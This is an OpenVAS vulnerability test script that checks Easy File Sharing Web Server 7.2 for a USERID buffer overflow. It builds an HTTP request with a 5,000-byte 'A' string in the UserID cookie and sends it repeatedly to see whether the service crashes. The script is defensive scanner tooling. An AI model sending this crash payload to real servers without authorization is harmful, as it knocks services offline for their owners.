##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_easy_file_sharing_server_userid_bof_vuln.nasl 4835 2016-12-22 06:42:42Z antu123 $
#
# Easy File Sharing Web Server USERID Buffer Overflow Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:efssoft:easy_file_sharing_web_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806516");
  script_version("$Revision: 4835 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-12-22 07:42:42 +0100 (Thu, 22 Dec 2016) $");
  script_tag(name:"creation_date", value:"2015-11-19 18:25:40 +0530 (Thu, 19 Nov 2015)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Easy File Sharing Web Server USERID Buffer Overflow Vulnerability");

  script_tag(name: "summary" , value:"The host is running Easy File Sharing Web
  Server and is prone to buffer overflow vulnerability.");

  script_tag(name: "vuldetect" , value:"Send a crafted request via HTTP GET
  and check whether it is able to crash or not.");

  script_tag(name: "insight" , value:"The flaw is due to an error when processing
  web requests and can be exploited to cause a buffer overflow via an overly long
  string passed to USERID in a GET request to 'changeuser.ghp' script.");

  script_tag(name: "impact" , value:"Successful exploitation may allow remote
  attackers to cause the application to crash, creating a denial-of-service
  condition.

  Impact Level: Application");

  script_tag(name: "affected" , value:"Easy File Sharing Web Server version 7.2
  and possibly below");

  script_tag(name: "solution" , value:"No solution or patch was made available for
  at least one year since disclosure of this vulnerability. Likely none will be
  provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by
  another one.");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/38526");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_easy_file_sharing_web_server_detect.nasl");
  script_mandatory_keys("Easy/File/Sharing/WebServer/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
dir = "";
url = "";
sndReq = "";
rcvRes = "";
http_port = 0;

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

## Cross Confirm to avoid FP
if(http_is_dead(port:http_port)){
  exit(0);
}

## Get host name or IP
host = http_host_name(port:http_port);
if(!host){
  exit(0);
}

## Constructing vulnerable url
url = "/changeuser.ghp";

UserID= crap(length:5000, data:"A");

## Sending crafted data
sndReq = 'GET ' + url + ' HTTP/1.1\r\n' +
         'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
         'Host:'+ host + ':' + http_port + '\r\n' +
         'Referer: http://' + host + '/\r\n' +
         'Cookie: SESSIONID=6771; UserID=' + UserID + '; PassWD=;\r\n' +
         'Conection: Keep-Alive' + '\r\n\r\n';

##Send Multiple Times , Inconsistency Issue
for (j=0;j<5;j++)
{
  rcvRes = http_send_recv(port:http_port, data:sndReq);

  ## confirm the exploit
  if(http_is_dead(port:http_port))
  {
    security_message(http_port);
    exit(0);
  }
}
